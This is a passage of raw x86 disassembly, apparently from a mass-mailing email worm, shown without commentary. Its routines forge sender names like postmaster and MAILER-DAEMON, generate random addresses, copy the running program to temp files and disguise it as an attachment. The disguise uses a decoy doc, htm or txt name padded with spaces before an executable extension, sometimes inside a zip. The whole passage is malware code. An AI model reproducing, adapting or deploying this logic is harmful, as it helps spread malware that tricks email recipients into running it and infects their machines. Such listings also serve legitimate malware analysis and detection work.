		push	offset aPostmaster_0 ; default

loc_8055E7:				; CODE XREF: sub_805575+3Aj
					; sub_805575+41j ...
		push	edi		; lpString1
		call	ds:lstrcpyA
		mov	esi, ds:lstrcatA
		push	offset asc_802200 ; lpString2
		push	edi		; lpString1
		call	esi ; lstrcatA
		call	sub_802E9C
		movzx	eax, ax
		push	3
		cdq
		pop	ecx
		idiv	ecx
		sub	edx, 0
		jz	short loc_805620
		dec	edx
		jz	short loc_805619
		push	offset aNoreply	; "noreply"
		jmp	short loc_805625
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_805619:				; CODE XREF: sub_805575+9Bj
		push	offset aMailerDaemon_0 ; "MAILER-DAEMON"
		jmp	short loc_805625
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_805620:				; CODE XREF: sub_805575+98j
		push	offset aPostmaster ; lpString2

loc_805625:				; CODE XREF: sub_805575+A2j
					; sub_805575+A9j
		push	edi		; lpString1
		call	esi ; lstrcatA
		push	offset a@	; lpString2
		push	edi		; lpString1
		call	esi ; lstrcatA
		lea	eax, [ebx+4]
		push	eax		; lpString2
		push	edi		; lpString1
		call	esi ; lstrcatA
		lea	eax, [ebx+4]
		add	ebx, 104h
		push	eax		; lpString2
		push	ebx		; lpString1
		call	ds:lstrcpyA
		push	offset asc_8021D8 ; lpString2
		push	edi		; lpString1
		call	esi ; lstrcatA
		jmp	loc_805704
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_805655:				; CODE XREF: sub_805575+15j
		mov	eax, ds:dword_80824C
		xor	esi, esi
		test	eax, eax
		jz	short loc_805691

loc_805660:				; CODE XREF: sub_805575+F1j
		mov	eax, [eax+6]
		inc	esi
		test	eax, eax
		jnz	short loc_805660
		cmp	esi, 1
		jle	short loc_805691
		call	sub_802EB8
		xor	edx, edx
		xor	ecx, ecx
		div	esi
		mov	eax, ds:dword_80824C
		test	eax, eax
		jz	short loc_805691

loc_805681:				; CODE XREF: sub_805575+116j
		cmp	ecx, edx
		jz	short loc_80568D
		mov	eax, [eax+6]
		inc	ecx
		test	eax, eax
		jnz	short loc_805681

loc_80568D:				; CODE XREF: sub_805575+10Ej
		test	eax, eax
		jnz	short loc_8056EA

loc_805691:				; CODE XREF: sub_805575+E9j
					; sub_805575+F6j ...
		call	sub_802E9C
		movzx	eax, ax
		push	5
		xor	esi, esi
		cdq
		pop	ecx
		idiv	ecx
		add	edx, 3
		test	edx, edx
		mov	[ebp+var_4], edx
		jle	short loc_8056C5

loc_8056AB:				; CODE XREF: sub_805575+14Ej
		call	sub_802E9C
		movzx	eax, ax
		push	1Ah
		cdq
		pop	ecx
		idiv	ecx
		add	dl, 61h
		mov	[edi+esi], dl
		inc	esi
		cmp	esi, [ebp+var_4]
		jl	short loc_8056AB

loc_8056C5:				; CODE XREF: sub_805575+134j
		mov	byte ptr [esi+ebx+208h], 40h
		mov	esi, offset aYahoo_com ; "yahoo.com"
		push	esi		; lpString2
		push	edi		; lpString1
		call	ds:lstrcatA
		add	ebx, 104h
		push	esi		; lpString2
		push	ebx		; lpString1
		call	ds:lstrcpyA
		jmp	short loc_805704
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_8056EA:				; CODE XREF: sub_805575+11Aj
		lea	esi, [eax+0Ah]
		push	esi		; lpString2
		push	edi		; lpString1
		call	ds:lstrcpyA
		add	ebx, 104h
		push	esi
		push	ebx
		call	sub_805551
		pop	ecx
		pop	ecx

loc_805704:				; CODE XREF: sub_805575+DBj
					; sub_805575+173j
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_805575	endp

; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ
off_805709	dd offset loc_8055AA	; DATA XREF: sub_805575+2Er
		dd offset loc_8055B1	; jump table for switch	statement
		dd offset loc_8055B8
		dd offset loc_8055BF
		dd offset loc_8055C6
		dd offset loc_8055CD
		dd offset loc_8055D4
		dd offset loc_8055DB

;  S U B	R O U T	I N E 


sub_805729	proc near		; CODE XREF: sub_8062CA+9Fp
		push	esi
		mov	esi, eax
		push	edi
		push	offset a_com	; char *
		lea	edi, [esi+4]
		push	edi		; char *
		call	ds:strstr
		pop	ecx
		test	eax, eax
		pop	ecx
		jz	short loc_805783
		call	sub_802E9C
		movzx	eax, ax
		push	64h
		cdq
		pop	ecx
		idiv	ecx
		cmp	edx, 28h
		jge	short loc_805783
		call	sub_802E9C
		movzx	eax, ax
		push	64h
		cdq
		pop	ecx
		idiv	ecx
		cmp	edx, 3Ch
		jge	short loc_805780
		push	dword ptr [esi+204h] ; lpString2

loc_80576E:				; CODE XREF: sub_805729+58j
		add	esi, 4ABh
		push	esi		; lpString1
		call	ds:lstrcpyA
		jmp	loc_8058E2
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_805780:				; CODE XREF: sub_805729+3Dj
		push	edi
		jmp	short loc_80576E
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_805783:				; CODE XREF: sub_805729+17j
					; sub_805729+2Aj
		push	ebx
		call	sub_802E9C
		movzx	eax, ax
		push	64h
		cdq
		pop	ecx
		idiv	ecx
		cmp	edx, 8
		jge	short loc_8057D7
		call	sub_802E9C
		movzx	eax, ax
		push	5
		xor	edi, edi
		cdq
		pop	ecx
		idiv	ecx
		mov	ebx, edx
		add	ebx, 3
		test	ebx, ebx
		jle	short loc_8057CD

loc_8057B0:				; CODE XREF: sub_805729+A2j
		call	sub_802E9C
		movzx	eax, ax
		push	1Ah
		cdq
		pop	ecx
		idiv	ecx
		add	dl, 61h
		mov	[esi+edi+408h],	dl
		inc	edi
		cmp	edi, ebx
		jl	short loc_8057B0

loc_8057CD:				; CODE XREF: sub_805729+85j
		and	byte ptr [edi+esi+408h], 0
		jmp	short loc_805836
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_8057D7:				; CODE XREF: sub_805729+6Cj
		xor	edi, edi
		mov	al, 32h
		inc	edi
		mov	ecx, offset byte_801AA8

loc_8057E1:				; CODE XREF: sub_805729+C4j
		movsx	eax, al
		add	ecx, 8
		add	edi, eax
		mov	al, [ecx]
		test	al, al
		jnz	short loc_8057E1
		call	sub_802E9C
		movzx	eax, ax
		cdq
		idiv	edi
		xor	edi, edi
		xor	eax, eax
		inc	edi
		mov	cl, 32h

loc_805801:				; CODE XREF: sub_805729+EBj
		movsx	ecx, cl
		add	edi, ecx
		cmp	edi, edx
		jge	short loc_805816
		mov	cl, ds:byte_801AB0[eax*8]
		inc	eax
		test	cl, cl
		jnz	short loc_805801

loc_805816:				; CODE XREF: sub_805729+DFj
		cmp	ds:byte_801AA8[eax*8], 0
		jnz	short loc_805822
		xor	eax, eax

loc_805822:				; CODE XREF: sub_805729+F5j
		push	ds:off_801AAC[eax*8] ; lpString2
		lea	eax, [esi+408h]
		push	eax		; lpString1
		call	ds:lstrcpyA

loc_805836:				; CODE XREF: sub_805729+ACj
		xor	edi, edi
		mov	al, 32h
		inc	edi
		mov	ecx, offset byte_801AF8

loc_805840:				; CODE XREF: sub_805729+123j
		movsx	eax, al
		add	ecx, 8
		add	edi, eax
		mov	al, [ecx]
		test	al, al
		jnz	short loc_805840
		call	sub_802E9C
		movzx	eax, ax
		cdq
		idiv	edi
		xor	edi, edi
		xor	eax, eax
		inc	edi
		mov	cl, 32h

loc_805860:				; CODE XREF: sub_805729+14Aj
		movsx	ecx, cl
		add	edi, ecx
		cmp	edi, edx
		jge	short loc_805875
		mov	cl, ds:byte_801B00[eax*8]
		inc	eax
		test	cl, cl
		jnz	short loc_805860

loc_805875:				; CODE XREF: sub_805729+13Ej
		cmp	ds:byte_801AF8[eax*8], 0
		jnz	short loc_805881
		xor	eax, eax

loc_805881:				; CODE XREF: sub_805729+154j
		push	ds:off_801AFC[eax*8] ; lpString2
		lea	edi, [esi+488h]
		push	edi		; lpString1
		call	ds:lstrcpyA
		lea	ebx, [esi+4ABh]
		add	esi, 408h
		push	edi
		push	esi
		push	offset aS_S	; LPCSTR
		push	ebx		; LPSTR
		call	ds:wsprintfA
		add	esp, 10h
		call	sub_802E9C
		movzx	eax, ax
		push	64h
		cdq
		pop	ecx
		idiv	ecx
		cmp	edx, 50h
		jl	short loc_8058D5
		cmp	edx, 5Ah
		jge	short loc_8058DA
		push	1		; cchLength
		push	ebx		; lpsz
		call	ds:CharUpperBuffA
		jmp	short loc_8058E1
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_8058D5:				; CODE XREF: sub_805729+19Aj
		cmp	edx, 5Ah
		jl	short loc_8058E1

loc_8058DA:				; CODE XREF: sub_805729+19Fj
		push	ebx		; lpsz
		call	ds:CharUpperA

loc_8058E1:				; CODE XREF: sub_805729+1AAj
					; sub_805729+1AFj
		pop	ebx

loc_8058E2:				; CODE XREF: sub_805729+52j
		pop	edi
		pop	esi
		retn
sub_805729	endp


;  S U B	R O U T	I N E 


sub_8058E5	proc near		; CODE XREF: sub_8062CA+AAp
		push	ebx
		push	esi
		mov	ebx, eax
		call	sub_802E9C
		movzx	eax, ax
		push	64h
		cdq
		pop	ecx
		idiv	ecx
		cmp	edx, 5
		jge	short loc_80594D
		push	edi
		call	sub_802E9C
		movzx	eax, ax
		push	0Fh
		xor	esi, esi
		cdq
		pop	ecx
		idiv	ecx
		mov	edi, edx
		add	edi, 3
		test	edi, edi
		jle	short loc_805942

loc_805916:				; CODE XREF: sub_8058E5+5Bj
		call	sub_802E9C
		movzx	eax, ax
		push	1Bh
		cdq
		pop	ecx
		idiv	ecx
		cmp	edx, 1Ah
		jnz	short loc_805933
		mov	byte ptr [ebx+esi+308h], 20h
		jmp	short loc_80593D
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_805933:				; CODE XREF: sub_8058E5+42j
		add	dl, 61h
		mov	[ebx+esi+308h],	dl

loc_80593D:				; CODE XREF: sub_8058E5+4Cj
		inc	esi
		cmp	esi, edi
		jl	short loc_805916

loc_805942:				; CODE XREF: sub_8058E5+2Fj
		and	byte ptr [esi+ebx+308h], 0
		pop	edi
		jmp	short loc_8059AD
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_80594D:				; CODE XREF: sub_8058E5+15j
		xor	esi, esi
		mov	al, 50h
		inc	esi
		mov	ecx, offset byte_801B30

loc_805957:				; CODE XREF: sub_8058E5+7Ej
		movsx	eax, al
		add	ecx, 8
		add	esi, eax
		mov	al, [ecx]
		test	al, al
		jnz	short loc_805957
		call	sub_802E9C
		movzx	eax, ax
		cdq
		idiv	esi
		xor	esi, esi
		xor	eax, eax
		inc	esi
		mov	cl, 50h

loc_805977:				; CODE XREF: sub_8058E5+A5j
		movsx	ecx, cl
		add	esi, ecx
		cmp	esi, edx
		jge	short loc_80598C
		mov	cl, ds:byte_801B38[eax*8]
		inc	eax
		test	cl, cl
		jnz	short loc_805977

loc_80598C:				; CODE XREF: sub_8058E5+99j
		cmp	ds:byte_801B30[eax*8], 0
		jnz	short loc_805998
		xor	eax, eax

loc_805998:				; CODE XREF: sub_8058E5+AFj
		push	ds:dword_801B34[eax*8]
		lea	eax, [ebx+308h]
		push	eax
		call	strcpy
		pop	ecx
		pop	ecx

loc_8059AD:				; CODE XREF: sub_8058E5+66j
		call	sub_802E9C
		movzx	eax, ax
		push	64h
		cdq
		pop	ecx
		idiv	ecx
		cmp	edx, 28h
		jl	short loc_8059D6
		cmp	edx, 5Ah
		jge	short loc_8059DB
		add	ebx, 308h
		push	1		; cchLength
		push	ebx		; lpsz
		call	ds:CharUpperBuffA
		jmp	short loc_8059E8
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_8059D6:				; CODE XREF: sub_8058E5+D9j
		cmp	edx, 5Ah
		jl	short loc_8059E8

loc_8059DB:				; CODE XREF: sub_8058E5+DEj
		add	ebx, 308h
		push	ebx		; lpsz
		call	ds:CharUpperA

loc_8059E8:				; CODE XREF: sub_8058E5+EFj
					; sub_8058E5+F4j
		pop	esi
		pop	ebx
		retn
sub_8058E5	endp


;  S U B	R O U T	I N E 


sub_8059EB	proc near		; CODE XREF: sub_805A22+58p
					; sub_805AA7+CBp

lpFileName	= dword	ptr  8

		push	esi
		push	0		; hTemplateFile
		push	80h		; dwFlagsAndAttributes
		push	3		; dwCreationDisposition
		push	0		; lpSecurityAttributes
		push	3		; dwShareMode
		push	0C0000000h	; dwDesiredAccess
		push	[esp+18h+lpFileName] ; lpFileName
		call	ds:CreateFileA
		mov	esi, eax
		cmp	esi, 0FFFFFFFFh
		jz	short loc_805A20
		push	esi
		push	0
		call	sub_807B94
		pop	ecx
		pop	ecx
		push	esi		; hObject
		call	ds:CloseHandle

loc_805A20:				; CODE XREF: sub_8059EB+22j
		pop	esi
		retn
sub_8059EB	endp


;  S U B	R O U T	I N E 

; Attributes: bp-based frame

sub_805A22	proc near		; CODE XREF: sub_805AA7+55p

PathName	= byte ptr -208h
String2		= byte ptr -104h
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 208h
		push	esi
		lea	eax, [ebp+PathName]
		push	edi
		push	eax		; lpBuffer
		push	104h		; nBufferLength
		call	ds:GetTempPathA
		lea	eax, [ebp+String2]
		push	eax		; lpTempFileName
		push	0		; uUnique
		lea	eax, [ebp+PathName]
		push	offset PrefixString ; lpPrefixString
		push	eax		; lpPathName
		call	ds:GetTempFileNameA
		mov	esi, [ebp+arg_0]
		lea	eax, [ebp+String2]
		push	0		; bFailIfExists
		push	eax		; lpNewFileName
		lea	edi, [esi+5ABh]
		push	edi		; lpExistingFileName
		call	ds:CopyFileA
		lea	eax, [ebp+String2]
		push	eax
		call	sub_8059EB
		add	esi, 4AAh
		pop	ecx
		cmp	byte ptr [esi],	0
		jz	short loc_805A92
		push	edi		; lpFileName
		call	ds:DeleteFileA

loc_805A92:				; CODE XREF: sub_805A22+67j
		lea	eax, [ebp+String2]
		push	eax		; lpString2
		push	edi		; lpString1
		call	ds:lstrcpyA
		mov	byte ptr [esi],	1
		pop	edi
		pop	esi
		leave
		retn
sub_805A22	endp


;  S U B	R O U T	I N E 

; Attributes: bp-based frame

sub_805AA7	proc near		; CODE XREF: sub_8062CA+B5p

PathName	= byte ptr -410h
String1		= byte ptr -30Ch
FileName	= byte ptr -10Ch
var_8		= dword	ptr -8
hObject		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		sub	esp, 410h
		push	ebx
		xor	ebx, ebx
		push	edi
		mov	[esi+4A8h], bl
		mov	[esi+4A9h], bl
		call	sub_802E9C
		movzx	eax, ax
		push	64h
		cdq
		pop	ecx
		idiv	ecx
		cmp	edx, 4Bh
		jge	short loc_805ADA
		mov	byte ptr [esi+4A8h], 1

loc_805ADA:				; CODE XREF: sub_805AA7+2Aj
		cmp	[esi+4A8h], bl
		jnz	short loc_805B07
		lea	eax, [esi+5ABh]
		push	104h		; nSize
		push	eax		; lpFilename
		push	ebx		; hModule
		mov	[esi+4AAh], bl
		call	ds:GetModuleFileNameA
		push	esi
		call	sub_805A22
		pop	ecx
		jmp	loc_805D24
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_805B07:				; CODE XREF: sub_805AA7+39j
		lea	eax, [ebp+PathName]
		mov	edi, 104h
		push	eax		; lpBuffer
		push	edi		; nBufferLength
		mov	byte ptr [esi+4AAh], 1
		call	ds:GetTempPathA
		cmp	[ebp+PathName],	bl
		jz	loc_805D91
		lea	eax, [ebp+FileName]
		push	eax		; lpTempFileName
		push	ebx		; uUnique
		lea	eax, [ebp+PathName]
		push	offset PrefixString ; lpPrefixString
		push	eax		; lpPathName
		call	ds:GetTempFileNameA
		lea	eax, [ebp+PathName]
		push	edi		; nSize
		push	eax		; lpFilename
		push	ebx		; hModule
		call	ds:GetModuleFileNameA
		lea	eax, [ebp+FileName]
		push	ebx		; bFailIfExists
		push	eax		; lpNewFileName
		lea	eax, [ebp+PathName]
		push	eax		; lpExistingFileName
		call	ds:CopyFileA
		lea	eax, [ebp+FileName]
		push	eax
		call	sub_8059EB
		pop	ecx
		lea	eax, [ebp+PathName]
		push	eax		; lpBuffer
		push	edi		; nBufferLength
		mov	[esi+5ABh], bl
		call	ds:GetTempPathA
		lea	edi, [esi+5ABh]
		lea	eax, [ebp+PathName]
		push	edi		; lpTempFileName
		push	ebx		; uUnique
		push	offset PrefixString ; lpPrefixString
		push	eax		; lpPathName
		call	ds:GetTempFileNameA
		cmp	[edi], bl
		jz	loc_805D91
		mov	[esi+4A9h], bl
		call	sub_802E9C
		movzx	eax, ax
		push	64h
		cdq
		pop	ecx
		idiv	ecx
		cmp	edx, 32h
		jge	short loc_805BCE
		mov	byte ptr [esi+4A9h], 1

loc_805BCE:				; CODE XREF: sub_805AA7+11Ej
		cmp	[esi+4A9h], bl
		jnz	short loc_805BE3
		lea	eax, [esi+4ABh]
		push	eax
		push	edi
		jmp	loc_805CE4
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_805BE3:				; CODE XREF: sub_805AA7+12Dj
		lea	eax, [esi+408h]
		push	eax		; lpString2
		lea	eax, [ebp+String1]
		push	eax		; lpString1
		call	ds:lstrcpyA
		mov	edi, ds:lstrcatA
		lea	eax, [ebp+String1]
		push	offset a__0	; lpString2
		push	eax		; lpString1
		call	edi ; lstrcatA
		call	sub_802E9C
		movzx	eax, ax
		push	5
		cdq
		pop	ecx
		idiv	ecx
		cmp	edx, ebx
		jz	short loc_805C3E
		jle	short loc_805C37
		cmp	edx, 2
		jle	short loc_805C30
		cmp	edx, 3
		jnz	short loc_805C37
		push	offset aHtml	; "html"
		jmp	short loc_805C43
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_805C30:				; CODE XREF: sub_805AA7+17Bj
		push	offset aHtm	; "htm"
		jmp	short loc_805C43
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_805C37:				; CODE XREF: sub_805AA7+176j
					; sub_805AA7+180j
		push	offset aTxt	; "txt"
		jmp	short loc_805C43
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_805C3E:				; CODE XREF: sub_805AA7+174j
		push	offset aDoc	; lpString2

loc_805C43:				; CODE XREF: sub_805AA7+187j
					; sub_805AA7+18Ej ...
		lea	eax, [ebp+String1]
		push	eax		; lpString1
		call	edi ; lstrcatA
		call	sub_802E9C
		movzx	eax, ax
		cdq
		mov	ecx, 0C8h
		idiv	ecx
		add	edx, 1Eh
		cmp	edx, ebx
		jle	short loc_805C79
		mov	[ebp+hObject], edx

loc_805C66:				; CODE XREF: sub_805AA7+1D0j
		lea	eax, [ebp+String1]
		push	offset asc_801A50 ; lpString2
		push	eax		; lpString1
		call	edi ; lstrcatA
		dec	[ebp+hObject]
		jnz	short loc_805C66

loc_805C79:				; CODE XREF: sub_805AA7+1BAj
		lea	eax, [ebp+String1]
		push	offset a__0	; lpString2
		push	eax		; lpString1
		call	edi ; lstrcatA
		call	sub_802E9C
		movzx	eax, ax
		push	3
		cdq
		pop	ecx
		idiv	ecx
		lea	eax, [ebp+String1]
		sub	edx, ebx
		jz	short loc_805CC0
		dec	edx
		jz	short loc_805CB1
		push	offset aP	; lpString2
		push	eax		; lpString1
		call	edi ; lstrcatA
		push	offset aIf	; "if"
		jmp	short loc_805CCD
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_805CB1:				; CODE XREF: sub_805AA7+1F9j
		push	offset aS_0	; lpString2
		push	eax		; lpString1
		call	edi ; lstrcatA
		push	offset aCr	; "cr"
		jmp	short loc_805CCD
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_805CC0:				; CODE XREF: sub_805AA7+1F6j
		push	offset aE	; lpString2
		push	eax		; lpString1
		call	edi ; lstrcatA
		push	offset aXe	; lpString2

loc_805CCD:				; CODE XREF: sub_805AA7+208j
					; sub_805AA7+217j
		lea	eax, [ebp+String1]
		push	eax		; lpString1
		call	edi ; lstrcatA
		lea	eax, [ebp+String1]
		push	eax
		lea	eax, [esi+5ABh]
		push	eax

loc_805CE4:				; CODE XREF: sub_805AA7+137j
		lea	eax, [ebp+FileName]
		push	eax
		call	sub_805316
		add	esp, 0Ch
		test	eax, eax
		lea	eax, [ebp+FileName]
		push	eax		; lpFileName
		jnz	loc_805D8B
		call	ds:DeleteFileA
		lea	eax, [esi+408h]
		push	eax
		lea	eax, [esi+4ABh]
		push	offset aS_zip	; LPCSTR
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch

loc_805D24:				; CODE XREF: sub_805AA7+5Bj
		push	ebx		; hTemplateFile
		push	80h		; dwFlagsAndAttributes
		push	3		; dwCreationDisposition
		push	ebx		; lpSecurityAttributes
		push	3		; dwShareMode
		lea	edi, [esi+5ABh]
		push	80000000h	; dwDesiredAccess
		push	edi		; lpFileName
		mov	[ebp+var_8], edi
		call	ds:CreateFileA
		cmp	eax, ebx
		mov	[ebp+hObject], eax
		jz	short loc_805D82
		cmp	eax, 0FFFFFFFFh
		jz	short loc_805D82
		push	ebx		; lpFileSizeHigh
		push	eax		; hFile
		lea	edi, [esi+6B0h]
		call	ds:GetFileSize
		push	[ebp+hObject]	; hObject
		mov	[edi], eax
		call	ds:CloseHandle
		cmp	dword ptr [edi], 400h
		jge	short loc_805D7E
		cmp	[esi+4AAh], bl
		jz	short loc_805D91
		push	[ebp+var_8]
		jmp	short loc_805D8B
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_805D7E:				; CODE XREF: sub_805AA7+2C8j
		xor	eax, eax
		jmp	short loc_805D94
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_805D82:				; CODE XREF: sub_805AA7+2A2j
					; sub_805AA7+2A7j
		cmp	[esi+4AAh], bl
		jz	short loc_805D91
		push	edi		; lpFileName

loc_805D8B:				; CODE XREF: sub_805AA7+255j
					; sub_805AA7+2D5j
		call	ds:DeleteFileA

loc_805D91:				; CODE XREF: sub_805AA7+80j
					; sub_805AA7+101j ...
		xor	eax, eax
		inc	eax

loc_805D94:				; CODE XREF: sub_805AA7+2D9j
		pop	edi
		pop	ebx
		leave
		retn
sub_805AA7	endp


;  S U B	R O U T	I N E 


sub_805D98	proc near		; CODE XREF: sub_8061F8+48p
		push	ebp
		push	esi
		push	edi
		mov	esi, eax
		call	sub_802E9C
		movzx	eax, ax
		push	64h
		cdq
		pop	ecx
		idiv	ecx
		cmp	edx, 14h
		jge	short loc_805E19
		call	sub_802E9C
		movzx	eax, ax
		cdq
		mov	ecx, 0BB8h
		xor	edi, edi
		idiv	ecx
		mov	ebp, edx
		add	ebp, 78h
		test	ebp, ebp
		jle	short loc_805E10

loc_805DCB:				; CODE XREF: sub_805D98+76j
		call	sub_802E9C
		cmp	al, 20h
		jb	short loc_805E0C
		cmp	al, 3Dh
		jz	short loc_805E0C
		cmp	al, 2Bh
		jz	short loc_805E0C
		cmp	al, 0FFh
		jz	short loc_805E0C
		cmp	al, 7Fh
		jz	short loc_805E0C
		cmp	al, 80h
		jz	short loc_805E0C
		cmp	al, 40h
		jz	short loc_805E0C
		mov	[edi+esi], al
		inc	edi
		call	sub_802E9C
		movzx	eax, ax
		push	3Ch
		cdq
		pop	ecx
		idiv	ecx
		test	edx, edx
		jnz	short loc_805E0C
		mov	byte ptr [edi+esi], 0Dh
		inc	edi
		mov	byte ptr [edi+esi], 0Ah
		inc	edi

loc_805E0C:				; CODE XREF: sub_805D98+3Aj
					; sub_805D98+3Ej ...
		cmp	edi, ebp
		jl	short loc_805DCB

loc_805E10:				; CODE XREF: sub_805D98+31j
		and	byte ptr [edi+esi], 0
		jmp	loc_805F68
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_805E19:				; CODE XREF: sub_805D98+16j
		xor	edi, edi
		push	0Fh
		inc	edi
		pop	eax
		mov	ecx, offset dword_801BB0

loc_805E24:				; CODE XREF: sub_805D98+95j
		add	ecx, 8
		add	edi, eax
		mov	eax, [ecx]
		test	eax, eax
		jnz	short loc_805E24
		call	sub_802E9C
		movzx	eax, ax
		cdq
		idiv	edi
		xor	edi, edi
		push	0Fh
		xor	eax, eax
		inc	edi
		pop	ecx

loc_805E42:				; CODE XREF: sub_805D98+BAj
		add	edi, ecx
		cmp	edi, edx
		jge	short loc_805E54
		mov	ecx, ds:dword_801BB8[eax*8]
		inc	eax
		test	ecx, ecx
		jnz	short loc_805E42

loc_805E54:				; CODE XREF: sub_805D98+AEj
